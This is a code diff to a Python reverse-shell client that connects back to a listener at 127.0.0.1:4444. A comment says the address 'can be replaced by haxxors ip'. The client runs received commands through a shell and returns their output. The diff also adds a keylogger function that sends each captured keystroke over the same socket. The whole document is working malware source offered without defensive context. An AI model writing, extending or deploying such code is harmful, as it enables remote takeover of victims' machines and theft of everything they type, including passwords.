@@ -4,8 +4,9 @@ import os
 import struct
 
 def send_msg(socks, msg):
-    msg = struct.pack(">I", len(msg)) + msg
-    socks.sendall(msg)
+    packed_msg = struct.pack(">I", len(msg)) + msg
+    socks.sendall(packed_msg)
+
 def recv_msg(socks):
     raw_msg = recvall(socks, 4)
     if not raw_msg:
@@ -13,6 +14,7 @@ def recv_msg(socks):
     msglen = struct.unpack(">I", raw_msg)[0]
     val = recvall(socks, msglen)
     return val
+    
 def recvall(sock,n):
     data = b''
     while len(data) < n:
@@ -22,11 +24,19 @@ def recvall(sock,n):
         data += packet
     return data
 
+def keylog(key):
+    try:
+        k = key.char
+    except: k = key.name
+    send_msg(s, k)
+	
 def connect():
+    global s
     while 1:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(("127.0.0.1", 4444))
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #tcp socket
+            s.connect(("127.0.0.1", 4444)) # 127.0.0.1 is localhost or current connected network
+             # 127.0.0.1 can be replaced by haxxors ip
             break
         except socket.error:
             pass
@@ -34,17 +44,17 @@ def connect():
         try:
             recv = recv_msg(s)
             if recv[:2].decode("utf-8") == "cd":
-                send_msg(s,bytearray(os.getcwd(),"utf-8"))
+                send_msg(s,bytearray(os.getcwd(), "utf-8"))
             if len(recv.decode("utf-8")) > 0:
-                process = subprocess.Popen(recv.decode("utf-8"), shell=True,
+                process = subprocess.Popen(recv.decode("utf-8"),
+                                       shell=True,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE,
                                        bufsize=1)
-                output_bytes = process.stdout.readlines() + process.stderr.readlines()
+                output_bytes, err = process.communicate()
                 outputbytes = bytearray(str(output_bytes), "utf-8")
                 send_msg(s,outputbytes)
-                print("sent output")
         except socket.error:
             s.close()
             print("Error Trying Again....")
